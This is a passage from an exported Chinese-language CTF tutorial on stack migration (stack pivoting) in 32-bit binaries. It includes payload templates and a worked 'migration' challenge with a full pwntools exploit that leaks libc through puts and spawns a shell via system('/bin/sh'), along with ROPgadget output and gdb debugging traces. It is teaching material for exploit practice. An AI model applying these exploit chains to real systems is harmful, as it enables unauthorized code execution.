integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bf9e81d8-ea8f-4754-9d47-6c070ab9d151" class="code"><code class="language-C">#环境：x32
+char bss[0x600];
+
+void func(){
+	char buf[0x40];
+	read(0,buf,0x68);//假设在retaddr后还有0x10空间
+}</code></pre><p id="02d2ba05-b380-4133-9739-db0333b8c6e7" class="">可以构建栈迁移payload如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="43ce169e-53b8-4642-bc00-9b8ca03c3dd3" class="code"><code class="language-Python">payload1 = b&#x27;a&#x27;*offset+p32(bss+0x300)
+payload1+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x300)+p32(100)
+p.sendline(payload1)
+payload2 = p32(bss+0x400)+p32(某函数地址)+p32(某函数返回地址)+p32(某函数传参)
+p.sendline(payload2)</code></pre><p id="df3604ab-031e-41ad-b022-004777bf2861" class="">payload1是触发一个向bss+0x300写入东西的资格（read），然后再设置ebp指向bss+0x300再设置写入后执行leaveret</p><p id="be2bdacd-b789-4a87-bf5f-f27ed87b8a8c" class="">payload2是向bss+0x300要写入的内容，其中包含ebp的宿舍和一个任意函数执行语句</p><p id="295e3bad-582a-4d66-8066-337c1b0e51a5" class="">这样leave_ret执行后，就会触发任意函数执行</p></details></li></ul><p id="db1e9d64-03ee-4ebf-bed5-36002f662acf" class=""><strong>2、考虑多次栈迁移的情况</strong></p><p id="bcbc5159-dad6-4068-9f6f-f3df9c78c192" class="">如果想要多次进行任意函数调用，每次用一个单独的payload传给程序，那就只要能够多次构筑出类似于这个第一步的结构并且实现完任意函数调用之后还能让他再调个read即可</p><p id="0d60cf49-9079-4b5a-92a7-316893f5cf57" class="">例如我们选定2个地址bss+0x300~bss+0x600，那么我们每次要执行一个函数调用的时候就栈迁移到bss+0x300~bss+0x600一次，然后每次栈迁移的时候就把一些指针指向下一次要栈迁移的地方，以此为了下一次栈迁移做准备，可以通过构造以下这样一个结构实现：</p><figure id="c7b8b1d3-9329-4d87-a4b4-51419ef43b7d" class="image" style="text-align:left"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%202.png"><img style="width:336px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%202.png"/></a></figure><ul id="b2a95ffe-d8c6-44e4-a592-22a6980fe4e7" class="toggle"><li><details open=""><summary>假设我们想要通过三次传payload来产生3次函数调用</summary><p id="9e264f11-1dd1-4ead-b818-f6e9f705a677" class="">思路：</p><p id="f9713077-12d4-47ee-a961-82df53814865" class="">为我们要构建三个这样的结构：</p><figure id="d954cf50-0c59-4cb4-85dc-76736fab5572" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%203.png"><img style="width:539px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%203.png"/></a><figcaption>payload2构建的</figcaption></figure><figure id="10c4b98a-71c9-481f-932b-181766384e40" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%204.png"><img style="width:550px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%204.png"/></a><figcaption>payload3构建的</figcaption></figure><figure id="fae105d6-66ef-46e0-953f-c71581012f0d" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%205.png"><img style="width:533px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%205.png"/></a><figcaption>payload4构建的</figcaption></figure><p id="b3aa36fd-2849-45f8-824a-d8cf85fcf246" class="">四个payload构建如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9a517645-e698-4e4f-8935-a2526dec35ab" class="code"><code class="language-Python">payload1 = b&#x27;a&#x27;*offset+p32(bss+0x300)
+payload1+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x300)+p32(100)
+p.sendline(payload1)
+payload2 = p32(bss+0x400)+p32(函数1地址)+p32(popnret)+函数1的n个传参
+payload2+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x400)+p32(100)
+p.sendline(payload2)
+payload3 = p32(bss+0x500)+p32(函数2地址)+p32(popnret)+函数2的n个传参
+payload3+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x500)+p32(100)
+p.sendline(payload3)
+payload4 = p32(bss+0x600)+p32(函数3地址)+p32(popnret)+函数3的n个传参
+payload4+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x600)+p32(100)
+p.sendline(payload4)</code></pre><p id="dbdc781f-033b-499a-a95a-43892288a52c" class="">payload1是触发一个向bss+0x300写入东西的资格（read），然后再设置ebp指向bss+0x300再设置写入后执行leaveret</p><p id="d0e66aa7-3c4a-46e7-9cc3-5548abb1d718" class="">payload2是向bss+0x300要写入的内容，其中包含ebp的宿舍和一个任意函数执行语句，还有触发一个向bss+0x400写入东西的资格（read），然后再设置ebp指向bss+0x400再设置写入后执行leaveret</p><p id="f24a03a9-68c1-4120-a657-1e0c6205cf72" class="">payload3是向bss+0x400要写入的内容，其中包含ebp的宿舍和一个任意函数执行语句，还有触发一个向bss+0x500写入东西的资格（read），然后再设置ebp指向bss+0x500再设置写入后执行leaveret</p><p id="fc882aca-3c72-4bd4-9611-b72ec09b174a" class="">payload4是向bss+0x500要写入的内容，其中包含ebp的宿舍和一个任意函数执行语句，还有触发一个向bss+0x600写入东西的资格（read），然后再设置ebp指向bss+0x600再设置写入后执行leaveret</p></details></li></ul><h3 id="c361c533-ed16-4164-8346-b1ac9eb24535" class="">迁移到哪里</h3><p id="2bcfb8ca-0a9f-4da9-9227-c825945d7b1d" class="">开gdb输入info proc mappings，就可以看到哪里是来自程序定义的RW的数据段，我们就往那儿写入东西，如下：</p><figure id="e1651edc-1d15-4fd9-b46b-b8d2fd6588fe" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%206.png"><img style="width:866px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%206.png"/></a></figure><p id="7b6e16bf-26e8-4680-8a22-c5328de9de4f" class="">可以看到rw的数据段是0x0804A000到0x0804B000 </p><p id="ab41d68d-e36b-4b48-b16b-24d9eec09716" class="">再开IDA拉到最后面，如下：</p><figure id="785dc0c4-6c0e-4185-b2b0-6cf222e0771d" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%207.png"><img style="width:1473px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%207.png"/></a></figure><p id="28799788-ce5e-43fd-ad98-1f73f73084c0" class="">可以看到程序有用的数据记录到0x0804A02C处，此处后面就没记东西可以拿来用了，所以只要迁到0x0804A02C~0x0804B000 处即可，最好是距离0x0804A02C有个0x200B作为栈顶，因为函数执行过程中栈顶会下降</p></details></li></ul><h3 id="720e2ad8-4cf1-4246-8078-9c3542f9c7fb" class="">4-例题</h3><ul id="57530924-6287-491c-9068-134c0d1f283e" class="toggle"><li><details open=""><summary>以这道migration为例(通过连续两个leave实现栈迁移)</summary><figure id="dee941d4-8558-4abb-bb29-cbe27e618c6a"><div class="source"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/migration.rar">migration.rar</a></div></figure><ul id="7ce43812-b5dc-4f4d-a190-6a0df046fa69" class="toggle"><li><details open=""><summary><strong>1、逆向</strong></summary><p id="377562f9-fb6d-4cf5-a7ec-c310390f3d26" class="">检查文件保护</p><figure id="a17194dc-421f-4dcb-8d65-fb72c51046e4" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%208.png"><img style="width:336px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%208.png"/></a></figure><p id="e434a437-7f3a-41a9-9dbe-b98481083f9a" class="">32位程序没开pie，简单~，但是注意这里是full_relro</p><p id="a3612a2a-5a97-4910-badd-b09cddde6012" class="">拖入IDA查看</p><figure id="ba3d6d5e-54c1-4af9-9f35-b870d932a3a1" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%209.png"><img style="width:384px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%209.png"/></a></figure><p id="3449eaa6-0021-4110-be8f-85134766c797" class="">这里限制了ret2main，所以我们ret2libc时需要ret2其他函数</p><p id="5debde05-76b2-44cc-852d-950348ec6751" class="">同时read也限制了读取宽度，所以要用栈迁移技巧</p><p id="80baebbb-8b1d-4c12-b287-72306347885f" class="">开gdb看看：</p><figure id="8814241c-756a-4a77-985b-7c6b528982d2" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%2010.png"><img style="width:859px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%2010.png"/></a></figure><p id="e85c7b93-9b5f-425b-baa8-486e19c58fbd" class="">可见0x804a000后的0x1000B都是rw的数据段 </p><p id="f34f444f-7f41-411a-8487-9bee7b9bf6d9" class="">开IDA看看</p><figure id="3de5fbb4-8ed4-4ba6-9c76-2a66482c212c" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%207.png"><img style="width:1473px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%207.png"/></a></figure><p id="45e95ba5-b431-44da-9eef-6057ef6c99d1" class="">新栈不要写到0x804a02C之前的内容不然会出问题，那我我第一次栈迁移直接把esp迁移到0x804a300得了~</p></details></li></ul><ul id="83ec7128-7b07-43cc-882d-f39f5ad58a4b" class="toggle"><li><details open=""><summary><strong>2、思路</strong></summary><p id="0e0e9a0c-46ce-4838-af1d-582969c65529" class="">这里我们直接使用多次栈迁移技术，第一次栈迁移移到bss+0x300，并且执行一个puts泄露libc基址，第二次栈迁移移到bss+0x400，并且执行一个system(”/bin/sh”)</p></details></li></ul><ul id="c589af3a-f69d-4578-90ca-867564788d84" class="toggle"><li><details open=""><summary><strong>3、exp</strong></summary><p id="ac1edf5b-c020-45dd-9df4-45b3e8ab3497" class="">（1）先找栈溢出偏移和bss节基址还有leave_ret_gadgets和pop3ret和pop1ret，至于read@plt和read@got地址因为可以用pwntools的elf对象相应方法就不用获取</p><figure id="55218bba-499e-4273-9b39-59da2e253118" class="image"><a href="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%2011.png"><img style="width:717px" src="%E6%A0%88%E8%BF%81%E7%A7%BB%20912973dc709b44599983c7ba598d26ac/Untitled%2011.png"/></a><figcaption>栈溢出偏移：从buf填充到ebp前，需要填充0x28个字节</figcaption></figure><p id="cbb4a7ba-7f9b-4e63-9934-e83f51782345" class="">bss基址是0x0804a00c刚刚看bss大小的时候就顺便有了</p><p id="f14ebb50-5a45-4324-8365-eb72fb7dab63" class="">查看gadgets：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d9c94ffd-df73-4c91-9242-95132631c3ba" class="code"><code class="language-Shell">$ ROPgadget --binary ./migration --only &quot;leave|ret&quot;
+0x08048418 : leave ; ret
+$ ROPgadget --binary ./migration --only &quot;pop|ret&quot;
+0x08048569 : pop esi ; pop edi ; pop ebp ; ret
+0x0804836d : pop ebx ; ret</code></pre><p id="2a84a041-ad8f-45e8-bab6-bc226b894f99" class="">（2）exp如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="efaaf367-3ae7-4692-934a-610232c67edf" class="code"><code class="language-Python">from pwn import *
+p = process(&#x27;./migration&#x27;)
+#p=remote(&quot;10.144.0.228&quot;, 32778)
+elf=ELF(&#x27;./migration&#x27;)
+libc = ELF(&#x27;/usr/lib32/libc.so.6&#x27;)#本地libc文件
+context.log_level = &#x27;debug&#x27;
+
+leave_ret=0x08048504
+pop1ret=0x0804836d 
+pop3ret=0x08048569 
+read_plt=elf.plt[&#x27;read&#x27;]
+puts_plt=elf.plt[&#x27;puts&#x27;]
+puts_got=elf.got[&#x27;puts&#x27;]
+bss=0x0804a000
+offset=0x28
+
+pause()#debug
+p.recvuntil(b&#x27;:&#x27;)
+payload1 = b&#x27;a&#x27;*offset+p32(bss+0x300)
+payload1+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x300)+p32(100)
+p.sendline(payload1) 
+
+pause()#debug
+payload2 = p32(bss+0x400)+p32(puts_plt)+p32(pop1ret)+p32(puts_got)
+payload2+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x400)+p32(100)
+p.sendline(payload2)
+
+pause()#debug
+puts_addr = u32(p.recv(4))
+success(&quot;puts_addr = &quot;+hex(puts_addr))
+libc_base=puts_addr-libc.symbols[&#x27;puts&#x27;]
+binsh_addr = next(libc.search(b&#x27;/bin/sh&#x27;)) + libc_base
+system_addr = libc.symbols[&#x27;system&#x27;] + libc_base
+
+pause()#debug
+payload3 = p32(bss+0x500)+p32(system_addr)+p32(pop1ret)+p32(binsh_addr)
+payload3+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x500)+p32(100)
+p.sendline(payload3)
+p.interactive()</code></pre><p id="5c9342e4-2496-4beb-9e58-95580e2a2a51" class="">出问题了，调试</p><p id="069df159-3328-4073-a864-40538502f86d" class="">每个模块前插一个pause</p><p id="513cd5a6-54ef-43c8-aa30-8ce356a2ab8b" class="">断点下在leaveret_gadgets语句前</p><p id="97e342ca-af45-4e08-b597-c46374b88885" class="">b *0x08048504</p><p id="d1db0f14-da3a-48f5-8e59-0df781faf91d" class="">stack 60</p><p id="169dc130-ea4b-468a-ae72-f603c55ab1e2" class="">第一次跑到时是main要结束运行，调试信息如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a9acf7e4-3800-45b3-abff-659f39a0a4b7" class="code"><code class="language-Assembly">gef➤  stack 60
+00:0000│ ecx esp 0xffc24da0 ◂— 0x61616161 (&#x27;aaaa&#x27;)
+... ↓            9 skipped
+0a:0028│ ebp     0xffc24dc8 —▸ 0x804a30c ◂— 0x0
+0b:002c│         0xffc24dcc —▸ 0x8048380 (read@plt) ◂— jmp    dword ptr [0x8049fe8]
+0c:0030│         0xffc24dd0 —▸ 0x8048504 (main+89) ◂— leave  
+0d:0034│         0xffc24dd4 ◂— 0x0
+0e:0038│         0xffc24dd8 —▸ 0x804a30c ◂— 0x0
+0f:003c│         0xffc24ddc ◂— 0x64
+10:0040│         0xffc24de0 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+11:0044│         0xffc24de4 —▸ 0x80484ab (main) ◂— push   ebp
+12:0048│         0xffc24de8 ◂— 0x1
+13:004c│         0xffc24dec —▸ 0xffc24e84 —▸ 0xffc25261 ◂— 0x696d2f2e (&#x27;./mi&#x27;)
+14:0050│         0xffc24df0 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+15:0054│         0xffc24df4 —▸ 0x8048510 (__libc_csu_init) ◂— push   ebp
+16:0058│         0xffc24df8 —▸ 0xf7ffbb80 (_rtld_global_ro) ◂— 0x0</code></pre><p id="2c535be1-3a0d-4b78-99a2-c33565e1818a" class="">可以看到ebp，retaddr被正确的覆盖，然后再c一次，理论上还会跑到0x8048504一次</p><p id="9d229fb0-c4f0-4795-98ec-de626fe4d97b" class="">c了，但是这次不对啊，没有read就跑到了，大大滴诡异</p><p id="8d7b25f8-bb8b-42b6-a0b1-f76fb450c13e" class="">我们这里怀疑是read的传参有问题</p><p id="e6745ac5-91ac-4758-aae6-0c1083b7a82c" class="">经过测试，发现必须要用send方法，如果用sendline方法就刚好传0x41字节，而程序read是接受0x40字节，就会有一个回车堵在哪里导致你下次read读空，所以现在，修改程序为：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bd26d3c6-9b1c-470f-b1c6-91a18cf88626" class="code"><code class="language-Python">from pwn import *
+p = process(&#x27;./migration&#x27;)
+#p=remote(&quot;10.144.0.228&quot;, 32778)
+elf=ELF(&#x27;./migration&#x27;)
+libc = ELF(&#x27;/usr/lib32/libc.so.6&#x27;)#本地libc文件
+context.log_level = &#x27;debug&#x27;
+
+leave_ret=0x08048504
+pop1ret=0x0804836d 
+pop3ret=0x08048569 
+read_plt=elf.plt[&#x27;read&#x27;]
+puts_plt=elf.plt[&#x27;puts&#x27;]
+puts_got=elf.got[&#x27;puts&#x27;]
+bss=0x0804a000
+offset=0x28
+
+pause()#debug
+p.recvuntil(b&#x27;:&#x27;)
+payload1 = b&#x27;a&#x27;*offset+p32(bss+0x300)
+payload1+= p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x300)+p32(0x100)
+p.send(payload1)
+
+pause()#debug
+payload2 = p32(bss+0x400)+p32(puts_plt)+p32(pop1ret)+p32(puts_got)
+payload2 += p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x400)+p32(0x100)
+p.sendline(payload2)
+
+pause()#debug
+puts_addr = u32(p.recv(4))
+success(&quot;puts_addr = &quot;+hex(puts_addr))
+libc_base=puts_addr-libc.symbols[&#x27;puts&#x27;]
+binsh_addr = next(libc.search(b&#x27;/bin/sh&#x27;)) + libc_base
+system_addr = libc.symbols[&#x27;system&#x27;] + libc_base
+
+pause()#debug
+payload3 = p32(bss+0x500)+p32(system_addr)+p32(pop1ret)+p32(binsh_addr)
+payload3 += p32(read_plt)+p32(leave_ret)+p32(0)+p32(bss+0x500)+p32(0x100)
+p.sendline(payload3)
+p.interactive()</code></pre><p id="7d5fd18d-396a-4b82-a131-72d74de4c409" class="">然后又发现，还是不输出，这是为神魔呢</p><p id="38193fa9-b39e-4ee4-9cb5-648316769bf0" class="">还是先b *0x08048504，然后c两次，然后s，然后stack 60看看有没有问题</p><p id="bdad2d03-a281-4a38-9c00-6c7d47e62dcc" class="">没问题就再s，然后disas</p><p id="83b928ca-1ac0-43fe-acf7-4ffebb6c59b2" class="">没问题就再b *0x804836d#pop1ret处，然后c</p><p id="69459773-8be1-4966-b3f1-77c55785e1ba" class="">我们把接收到的东西打印出来，发现是个’\n’，知道了，应该是前面recvuntil(”:”)遗留下来了一个”\n”，再次修改exp，recvuntil那一行改为：</p><p id="eccca81b-7e55-4dd9-868c-8ff318b80569" class="">p.recvuntil(b&#x27;:\n&#x27;)</p><p id="dd893626-79e6-4003-af0e-35ed42b75c98" class="">成了！</p></details></li></ul></details></li></ul><h1 id="b0c0139b-e8d7-4794-83bc-d1f4099c1518" class="">二、SROP实现栈迁移</h1><div id="50f76261-030a-4396-8b45-3cfced73585b" class="column-list"><div id="c9b9a9d9-4f36-41ab-a141-082265748ef1" style="width:12.5%" class="column"><p id="14e3c8a8-113a-4ea9-b2de-f6acea565b6e" class="block-color-gray_background">参考→</p></div><div id="c2f0f48d-0053-4931-a5dd-a5ae2221b685" style="width:87.5%" class="column"><figure id="fb6e14fe-4fba-479e-8975-1dc665af4c41" class="link-to-page"><a href="https://www.notion.so/SROP-fb6e14fe4fba479e89751dc665af4c41?pvs=21"><img class="icon" src="https://www.notion.so/icons/flag-checkered_gray.svg"/>SROP</a></figure></div></div><p id="ab4d1805-0eb5-4b08-8a00-cf818f1c5857" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
